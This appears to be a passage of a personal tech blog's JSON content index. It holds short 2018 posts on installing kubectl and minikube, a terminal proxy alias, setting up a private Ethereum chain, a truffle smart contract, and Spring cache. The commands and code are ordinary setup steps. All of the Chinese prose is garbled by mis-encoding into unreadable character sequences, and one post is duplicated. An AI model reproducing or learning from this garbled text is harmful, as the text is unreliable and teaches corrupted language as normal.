githubhttps://github.com/ChainNovahttps://github.com/zhizaolianåŒºå—é“¾æŠ€æœ¯æŒ‡å—https://yeasy.gitbooks.io/blockchain_guide/kubectlhttps://github.com/kubernetes/kubernetes/blob/master/CHANGELOG.md?spm=5176.2020520152.0.0.49fd16dd7CL3is&amp;file=CHANGELOG.mdä»¥å¤ªåŠæ–‡æ¡£https://ethereum.gitbooks.io/frontier-guide/content/index.htmlå°è±¡å­¦é™¢è€å¸ˆgithubåœ°å€https://github.com/shanlusunIBM-Blockchain-Archivehttps://github.com/IBM-Blockchain-Archive/learn-chaincode","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"è¶…çº§è´¦æœ¬ hyperledger èµ„æ–™","slug":"history/tech/5afe274eab7ec5414e74c85f","date":"2018-05-18T01:07:26.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5afe274eab7ec5414e74c85f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5afe274eab7ec5414e74c85f/","excerpt":"","text":"å®˜æ–¹æ–‡æ¡£ï¼šhttps://hyperledger-fabric.readthedocs.io/en/release-1.1/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æ¯”ç‰¹å¸ç»“æ„","slug":"history/tech/5afe246cab7ec5414e74c85e","date":"2018-05-18T00:55:08.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5afe246cab7ec5414e74c85e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5afe246cab7ec5414e74c85e/","excerpt":"","text":"http://www.itdks.com/eventlist/detail/1428 1:17","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"nano","slug":"history/tech/5afe2401ab7ec5414e74c85d","date":"2018-05-18T00:53:21.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5afe2401ab7ec5414e74c85d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5afe2401ab7ec5414e74c85d/","excerpt":"","text":"1alias nano=&quot;nano -w -x -E -T&quot;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ä½¿ç”¨ npm å®‰è£… github ä»“åº“ä¸­çš„ä»£ç ","slug":"history/tech/5af802b0ab7ec5414e74c85c","date":"2018-05-12T21:17:36.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5af802b0ab7ec5414e74c85c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5af802b0ab7ec5414e74c85c/","excerpt":"","text":"ä½¿ç”¨npmå®‰è£…githubä»“åº“ä¸­çš„ä»£ç 1npm install https://github.com/GoogleChrome/puppeteer --save","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"python çˆ¬è™«å¸¸ç”¨åº“","slug":"history/tech/5af51547ee717629165813d8","date":"2018-05-11T04:00:07.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5af51547ee717629165813d8/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5af51547ee717629165813d8/","excerpt":"","text":"https://github.com/miyakogi/pyppeteerhttps://github.com/GoogleChrome/puppeteer/blob/master/docs/api.md#class-browserrequests-htmlfake-useragent","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"mac ä¸‹ pip å®‰è£… selenium æˆåŠŸï¼Œæç¤º no module named selenium","slug":"history/tech/5af4e0ceee717629165813d7","date":"2018-05-11T00:16:14.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5af4e0ceee717629165813d7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5af4e0ceee717629165813d7/","excerpt":"","text":"åŸå› ï¼šç³»ç»Ÿè‡ªå¸¦ python æœç´¢è·¯å¾„ä¸­æ²¡æœ‰ `/usr/local/python` æŸ¥çœ‹ç³»ç»Ÿæœç´¢è·¯å¾„ä¿¡æ¯ï¼š123python&gt;&gt;&gt; import sys&gt;&gt;&gt; sys.pathæŸ¥çœ‹pipä¿¡æ¯ï¼š12python -m pip --versionpip --versionè§£å†³1brew link python@2","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"centos å®‰è£… g++","slug":"history/tech/5af56d41ee717629165813d9","date":"2018-05-10T22:15:29.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5af56d41ee717629165813d9/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5af56d41ee717629165813d9/","excerpt":"","text":"centos å®‰è£… g++1yum install gcc-c++","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"vscode html ä»£ç è¡¥å…¨","slug":"history/tech/5aeff7d3ee717629165813d6","date":"2018-05-06T18:53:07.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5aeff7d3ee717629165813d6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5aeff7d3ee717629165813d6/","excerpt":"","text":"å®‰è£…HTML CSS Support æ’ä»¶ç”¨æˆ·è®¾ç½®ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç :12&quot;editor.parameterHints&quot;: true, &quot;editor.quickSuggestions&quot;: &#123; &quot;other&quot;: true, &quot;comments&quot;: true, &quot;strings&quot;: true &#125;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"mac å®‰è£… kubernetes","slug":"history/tech/5aedb6dcee717629165813d5","date":"2018-05-05T01:51:24.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5aedb6dcee717629165813d5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5aedb6dcee717629165813d5/","excerpt":"","text":"å®‰è£… VirtualBox:https://www.virtualbox.org/wiki/Downloadså®‰è£… kubectl:12# brew install kubectlcurl -LO https://storage.googleapis.com/kubernetes-release/release/v1.10.0/bin/darwin/amd64/kubectlå®˜æ–¹é“¾æ¥:https://kubernetes.io/docs/tasks/tools/install-kubectl/å®‰è£… minikube (minikube ä½¿ç”¨googleå®˜æ–¹åœ°å€å®‰è£…å¯åŠ¨å¡æ­»ï¼Œæ•…ä½¿ç”¨å›½å†…é˜¿é‡Œäº‘åœ°å€):1curl -Lo minikube http://kubernetes.oss-cn-hangzhou.aliyuncs.com/minikube/releases/v0.26.1/minikube-darwin-amd64 &amp;&amp; chmod +x minikube &amp;&amp; sudo mv minikube /usr/local/bin/windowsä½¿ç”¨å¦‚ä¸‹åœ°å€:1http://kubernetes.oss-cn-hangzhou.aliyuncs.com/minikube/releases/v0.26.1/minikube-windows-amd64.exegoogleå®˜æ–¹åœ°å€:1curl -Lo minikube https://storage.googleapis.com/minikube/releases/v0.26.1/minikube-darwin-amd64 &amp;&amp; chmod +x minikube &amp;&amp; sudo mv minikube /usr/local/bin/å¯åŠ¨:1minikube start --registry-mirror=https://registry.docker-cn.comå¯åŠ¨ dashboard:1minikube dashboardå®‰è£… helm:https://github.com/kubernetes/helm/releaseså‚è€ƒæ–‡çŒ®ï¼šhttps://kubernetes.io/docs/tasks/tools/install-kubectl/https://yq.aliyun.com/articles/221687","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"mac terminal ä»£ç†","slug":"history/tech/5aedb519ee717629165813d4","date":"2018-05-05T01:43:53.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5aedb519ee717629165813d4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5aedb519ee717629165813d4/","excerpt":"","text":"è®¾ç½®12345vim ~/.zshrc # proxy listalias proxy=&apos;export all_proxy=socks5://127.0.0.1:1080&apos;alias unproxy=&apos;unset all_proxy&apos;source ~/.zshrcæ‰“å¼€ä»£ç†12proxycurl ip.cn # æˆ–è€… curl cip.ccå…³é—­ä»£ç†1unproxyå‚è€ƒæ–‡çŒ®ï¼šhttps://github.com/mrdulin/blog/issues/18","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æ­å»ºä»¥å¤ªåŠç§é“¾","slug":"history/tech/5ae66b81093d7c195d71a941","date":"2018-04-30T01:04:01.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5ae66b81093d7c195d71a941/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ae66b81093d7c195d71a941/","excerpt":"","text":"åˆå§‹åŒ–ä»¥å¤ªåŠèŠ‚ç‚¹geth -datadir /data/eth/ init /usr/local/eth/genesis.json genesis.json:{ &quot;config&quot;: { &quot;chainId&quot;: 1000, &quot;homesteadBlock&quot;: 0, &quot;eip155Block&quot;: 0, &quot;eip158Block&quot;: 0 }, &quot;nonce&quot;: &quot;0x0000000000000061&quot;, &quot;timestamp&quot;: &quot;0x0&quot;, &quot;parentHash&quot;: &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;, &quot;gasLimit&quot;: &quot;0x8000000&quot;, &quot;difficulty&quot;: &quot;0x100&quot;, &quot;mixhash&quot;: &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;, &quot;coinbase&quot;: &quot;0x3333333333333333333333333333333333333333&quot;, &quot;alloc&quot;: {} } 12345678910chainId: ä»¥å¤ªåŠä¸»ç½‘chainIdä¸º0ï¼Œç§é“¾è‡ªå·±ä¿®æ”¹ä¸ºä¸€ä¸ªä»»æ„Idã€‚mixhash: ä¸nonceé…åˆç”¨äºæŒ–çŸ¿ï¼Œç”±ä¸Šä¸€ä¸ªåŒºå—çš„ä¸€éƒ¨åˆ†ç”Ÿæˆçš„hashã€‚æ³¨æ„å’Œnonceçš„è®¾ç½®éœ€è¦æ»¡è¶³ä»¥å¤ªåŠçš„é»„çš®ä¹¦, 4.3.4. Block Header Validity, (44)ç« èŠ‚æ‰€æè¿°çš„æ¡ä»¶ã€‚nonce: nonceå°±æ˜¯ä¸€ä¸ª64ä½éšæœºæ•°ï¼Œç”¨äºæŒ–çŸ¿ï¼Œæ³¨æ„ä»–å’Œmixhashçš„è®¾ç½®éœ€è¦æ»¡è¶³ä»¥å¤ªåŠçš„é»„çš®ä¹¦,4.3.4. Block Header Validity, (44)ç« èŠ‚æ‰€æè¿°çš„æ¡ä»¶ã€‚difficulty: è®¾ç½®å½“å‰åŒºå—çš„éš¾åº¦ï¼Œå¦‚æœéš¾åº¦è¿‡å¤§ï¼ŒcpuæŒ–çŸ¿å°±å¾ˆéš¾ï¼Œè¿™é‡Œè®¾ç½®è¾ƒå°éš¾åº¦alloc: ç”¨æ¥é¢„ç½®è´¦å·ä»¥åŠè´¦å·çš„ä»¥å¤ªå¸æ•°é‡ï¼Œå› ä¸ºç§æœ‰é“¾æŒ–çŸ¿æ¯”è¾ƒå®¹æ˜“ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦é¢„ç½®æœ‰å¸çš„è´¦å·ï¼Œéœ€è¦çš„æ—¶å€™è‡ªå·±åˆ›å»ºå³å¯ä»¥ã€‚coinbase: çŸ¿å·¥çš„è´¦å·ï¼Œéšä¾¿å¡«timestamp: è®¾ç½®åˆ›ä¸–å—çš„æ—¶é—´æˆ³parentHash: ä¸Šä¸€ä¸ªåŒºå—çš„hashå€¼ï¼Œå› ä¸ºæ˜¯åˆ›ä¸–å—ï¼Œæ‰€ä»¥è¿™ä¸ªå€¼æ˜¯0extraData: é™„åŠ ä¿¡æ¯ï¼Œéšä¾¿å¡«ï¼Œå¯ä»¥å¡«ä½ çš„ä¸ªæ€§ä¿¡æ¯gasLimit: å€¼è®¾ç½®å¯¹GASçš„æ¶ˆè€—æ€»é‡é™åˆ¶ï¼Œç”¨æ¥é™åˆ¶åŒºå—èƒ½åŒ…å«çš„äº¤æ˜“ä¿¡æ¯æ€»å’Œï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯ç§æœ‰é“¾ï¼Œæ‰€ä»¥å¡«æœ€å¤§ã€‚ å¯åŠ¨ç§é“¾çš„ä»¥å¤ªåŠèŠ‚ç‚¹1geth -datadir /data/eth/ --networkid 1000 consoleä»¥å¤ªåŠèŠ‚ç‚¹çš„ä¸»è¦æ“ä½œ:12345678910111213141516171819 admin eth personal miner&gt; personal.listAccounts[]&gt; personal.newAccount(&quot;qianrushi.org&quot;)&quot;0xcce01f2d1e7ab5ba8d9e5f68cf81b49d145e97fe&quot;&gt; personal.listAccounts[&quot;0xcce01f2d1e7ab5ba8d9e5f68cf81b49d145e97fe&quot;]&gt; personal.newAccount(&quot;embeded.org&quot;)&quot;0x27643bec775e242fbc06c0457f781d62249f012c&quot;&gt; personal.listAccounts[&quot;0xcce01f2d1e7ab5ba8d9e5f68cf81b49d145e97fe&quot;, &quot;0x27643bec775e242fbc06c0457f781d62249f012c&quot;]&gt; personal.unlockAccount(&quot;0xcce01f2d1e7ab5ba8d9e5f68cf81b49d145e97fe&quot;)Unlock account 0xcce01f2d1e7ab5ba8d9e5f68cf81b49d145e97fePassphrase: true å½“å‰åŒºå—ä¿¡æ¯12&gt; eth.blockNumber&gt; eth.getBlock( eth.blockNumber ) è´¦æˆ·ä½™é¢1&gt; web3.fromWei(eth.getBalance(eth.accounts[0]))","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"æ­å»ºä»¥å¤ªåŠç§é“¾","slug":"history/tech/5ae66b5e093d7c195d71a940","date":"2018-04-30T01:03:26.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5ae66b5e093d7c195d71a940/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ae66b5e093d7c195d71a940/","excerpt":"","text":"åˆå§‹åŒ–ä»¥å¤ªåŠèŠ‚ç‚¹geth -datadir /data/eth/ init /usr/local/eth/genesis.json genesis.json:{ &quot;config&quot;: { &quot;chainId&quot;: 1000, &quot;homesteadBlock&quot;: 0, &quot;eip155Block&quot;: 0, &quot;eip158Block&quot;: 0 }, &quot;nonce&quot;: &quot;0x0000000000000061&quot;, &quot;timestamp&quot;: &quot;0x0&quot;, &quot;parentHash&quot;: &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;, &quot;gasLimit&quot;: &quot;0x8000000&quot;, &quot;difficulty&quot;: &quot;0x100&quot;, &quot;mixhash&quot;: &quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;, &quot;coinbase&quot;: &quot;0x3333333333333333333333333333333333333333&quot;, &quot;alloc&quot;: {} } 12345678910chainId: ä»¥å¤ªåŠä¸»ç½‘chainIdä¸º0ï¼Œç§é“¾è‡ªå·±ä¿®æ”¹ä¸ºä¸€ä¸ªä»»æ„Idã€‚mixhash: ä¸nonceé…åˆç”¨äºæŒ–çŸ¿ï¼Œç”±ä¸Šä¸€ä¸ªåŒºå—çš„ä¸€éƒ¨åˆ†ç”Ÿæˆçš„hashã€‚æ³¨æ„å’Œnonceçš„è®¾ç½®éœ€è¦æ»¡è¶³ä»¥å¤ªåŠçš„é»„çš®ä¹¦, 4.3.4. Block Header Validity, (44)ç« èŠ‚æ‰€æè¿°çš„æ¡ä»¶ã€‚nonce: nonceå°±æ˜¯ä¸€ä¸ª64ä½éšæœºæ•°ï¼Œç”¨äºæŒ–çŸ¿ï¼Œæ³¨æ„ä»–å’Œmixhashçš„è®¾ç½®éœ€è¦æ»¡è¶³ä»¥å¤ªåŠçš„é»„çš®ä¹¦,4.3.4. Block Header Validity, (44)ç« èŠ‚æ‰€æè¿°çš„æ¡ä»¶ã€‚difficulty: è®¾ç½®å½“å‰åŒºå—çš„éš¾åº¦ï¼Œå¦‚æœéš¾åº¦è¿‡å¤§ï¼ŒcpuæŒ–çŸ¿å°±å¾ˆéš¾ï¼Œè¿™é‡Œè®¾ç½®è¾ƒå°éš¾åº¦alloc: ç”¨æ¥é¢„ç½®è´¦å·ä»¥åŠè´¦å·çš„ä»¥å¤ªå¸æ•°é‡ï¼Œå› ä¸ºç§æœ‰é“¾æŒ–çŸ¿æ¯”è¾ƒå®¹æ˜“ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸éœ€è¦é¢„ç½®æœ‰å¸çš„è´¦å·ï¼Œéœ€è¦çš„æ—¶å€™è‡ªå·±åˆ›å»ºå³å¯ä»¥ã€‚coinbase: çŸ¿å·¥çš„è´¦å·ï¼Œéšä¾¿å¡«timestamp: è®¾ç½®åˆ›ä¸–å—çš„æ—¶é—´æˆ³parentHash: ä¸Šä¸€ä¸ªåŒºå—çš„hashå€¼ï¼Œå› ä¸ºæ˜¯åˆ›ä¸–å—ï¼Œæ‰€ä»¥è¿™ä¸ªå€¼æ˜¯0extraData: é™„åŠ ä¿¡æ¯ï¼Œéšä¾¿å¡«ï¼Œå¯ä»¥å¡«ä½ çš„ä¸ªæ€§ä¿¡æ¯gasLimit: å€¼è®¾ç½®å¯¹GASçš„æ¶ˆè€—æ€»é‡é™åˆ¶ï¼Œç”¨æ¥é™åˆ¶åŒºå—èƒ½åŒ…å«çš„äº¤æ˜“ä¿¡æ¯æ€»å’Œï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯ç§æœ‰é“¾ï¼Œæ‰€ä»¥å¡«æœ€å¤§ã€‚ å¯åŠ¨ç§é“¾çš„ä»¥å¤ªåŠèŠ‚ç‚¹geth -datadir /data/eth/ --networkid 1000 console ä»¥å¤ªåŠèŠ‚ç‚¹çš„ä¸»è¦æ“ä½œ:admin eth personal miner &gt; personal.listAccounts [] &gt; personal.newAccount(&quot;qianrushi.org&quot;) &quot;0xcce01f2d1e7ab5ba8d9e5f68cf81b49d145e97fe&quot; &gt; personal.listAccounts [&quot;0xcce01f2d1e7ab5ba8d9e5f68cf81b49d145e97fe&quot;] &gt; personal.newAccount(&quot;embeded.org&quot;) &quot;0x27643bec775e242fbc06c0457f781d62249f012c&quot; &gt; personal.listAccounts [&quot;0xcce01f2d1e7ab5ba8d9e5f68cf81b49d145e97fe&quot;, &quot;0x27643bec775e242fbc06c0457f781d62249f012c&quot;] &gt; personal.unlockAccount(&quot;0xcce01f2d1e7ab5ba8d9e5f68cf81b49d145e97fe&quot;) Unlock account 0xcce01f2d1e7ab5ba8d9e5f68cf81b49d145e97fe Passphrase: true å½“å‰åŒºå—ä¿¡æ¯&gt; eth.blockNumber &gt; eth.getBlock( eth.blockNumber ) è´¦æˆ·ä½™é¢ &gt; web3.fromWei(eth.getBalance(eth.accounts[0]))","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"truffle æ­å»ºå® ç‰©å•†åº—","slug":"history/tech/5ae64903093d7c195d71a93f","date":"2018-04-29T22:36:51.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5ae64903093d7c195d71a93f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ae64903093d7c195d71a93f/","excerpt":"","text":"å®‰è£…æ™ºèƒ½åˆçº¦ç›¸å…³npm åŒ…12345npm install -g solcnpm install -g solc-clinpm install -g trufflenpm install -g ethereumjs-testrpc // å®‰è£… testrpc, Ganacheå±äºå®ƒçš„å‡çº§ç‰ˆnpm install web3 åˆ›å»ºå·¥ç¨‹123mkdir pet-shopcd pet-shoptruffle unbox pet-shoptruffle æ¡†æ¶ç›®å½•ä»‹ç»ï¼š1234contracts/ ï¼š æ™ºèƒ½åˆçº¦æ–‡ä»¶å­˜åœ¨è¿™é‡Œï¼Œåç¼€.sol ï¼ˆsolidityï¼‰migrations/ ï¼š éƒ¨ç½²è„šæœ¬test/ ï¼š æµ‹è¯•è„šæœ¬truffle.js ï¼štruffleçš„é…ç½®æ–‡ä»¶ ç¼–å†™æ™ºèƒ½åˆçº¦åœ¨ contracts/ ç›®å½•ä¸‹åˆ›å»º Adoption.sol æ–‡ä»¶1234567891011121314151617pragma solidity ^0.4.17; contract Adoption &#123; address[16] public adopters; //adopting a pet function adopt(uint petId) public returns (uint) &#123; require(petId &gt;= 0 &amp;&amp; petId &lt;= 15); adopters[petId] = msg.sender; return petId; &#125; //retrieve the adopters function getAdopters() public view returns (address[16]) &#123; return adopters; &#125; &#125; ç¼–è¯‘åˆçº¦1truffle compile éƒ¨ç½²åˆçº¦migratios/ ç›®å½•å†…åˆ›å»ºæ–°æ–‡ä»¶ 2_deploy_contracts.js ï¼š12345var Adoption = artifacts.require(&quot;Adoption&quot;);module.exports = function(deployer) &#123; deployer.deploy(Adoption);&#125;;éƒ¨ç½²æ™ºèƒ½åˆçº¦éƒ¨ç½²åˆ°ä»¥å¤ªåŠï¼ˆç§é“¾ï¼‰ä¸Šï¼š1truffle migrate","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ä»¥å¤ªåŠèµ„æ–™æ±‡æ€»","slug":"history/tech/5ae5bde0093d7c195d71a93e","date":"2018-04-29T00:43:12.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5ae5bde0093d7c195d71a93e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ae5bde0093d7c195d71a93e/","excerpt":"","text":"web å¯è§†åŒ–:ganacheganacheæ˜¯ ä¸€ä¸ªå›¾å½¢åŒ–æµ‹è¯•è½¯ä»¶ï¼ˆä¹Ÿæœ‰å‘½ä»¤è¡Œç‰ˆæœ¬ï¼‰ï¼Œå¯ä»¥ä¸€é”®åœ¨æœ¬åœ°æ­å»ºä»¥å¤ªåŠåŒºå—é“¾æµ‹è¯•ç¯å¢ƒï¼Œå¹¶ä¸”å°†åŒºå—é“¾çš„çŠ¶æ€é€šè¿‡å›¾å½¢ç•Œé¢æ˜¾ç¤ºå‡ºæ¥Solidityï¼šSolidityè½»é’±åŒ…ï¼šmetamaskmist é’±åŒ…ï¼šmistä»¥å¤ªåŠå¼€å‘ç¼–è¾‘å™¨ remixremixä»¥å¤ªåŠå®¢æˆ·ç«¯ä¸‹è½½https://geth.ethereum.org/downloads/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"è¿ç»´å·¥å…· paramiko","slug":"history/tech/5ae3eaa0093d7c195d71a93d","date":"2018-04-28T03:29:36.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5ae3eaa0093d7c195d71a93d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ae3eaa0093d7c195d71a93d/","excerpt":"","text":"paramiko","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Spring Boot æ—¥å¸¸é—®é¢˜å°è®¡ | Cache","slug":"history/tech/5ae002d2093d7c195d71a93c","date":"2018-04-25T04:23:46.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5ae002d2093d7c195d71a93c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ae002d2093d7c195d71a93c/","excerpt":"","text":"åŸºæœ¬åŸç†å’Œ spring çš„äº‹åŠ¡ç®¡ç†ç±»ä¼¼ï¼Œspring cache çš„å…³é”®åŸç†å°±æ˜¯ spring AOPï¼Œé€šè¿‡ spring AOPï¼Œå…¶å®ç°äº†åœ¨æ–¹æ³•è°ƒç”¨å‰ã€è°ƒç”¨åè·å–æ–¹æ³•çš„å…¥å‚å’Œè¿”å›å€¼ï¼Œè¿›è€Œå®ç°äº†ç¼“å­˜çš„é€»è¾‘ã€‚æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ä¸‹é¢è¿™ä¸ªå›¾ï¼šå›¾ 2. åŸå§‹æ–¹æ³•è°ƒç”¨å›¾ä¸Šå›¾æ˜¾ç¤ºï¼Œå½“å®¢æˆ·ç«¯â€œCalling codeâ€è°ƒç”¨ä¸€ä¸ªæ™®é€šç±» Plain Object çš„ foo() æ–¹æ³•çš„æ—¶å€™ï¼Œæ˜¯ç›´æ¥ä½œç”¨åœ¨ pojo ç±»è‡ªèº«å¯¹è±¡ä¸Šçš„ï¼Œå®¢æˆ·ç«¯æ‹¥æœ‰çš„æ˜¯è¢«è°ƒç”¨è€…çš„ç›´æ¥çš„å¼•ç”¨ã€‚è€Œ Spring cache åˆ©ç”¨äº† Spring AOP çš„åŠ¨æ€ä»£ç†æŠ€æœ¯ï¼Œå³å½“å®¢æˆ·ç«¯å°è¯•è°ƒç”¨ pojo çš„ 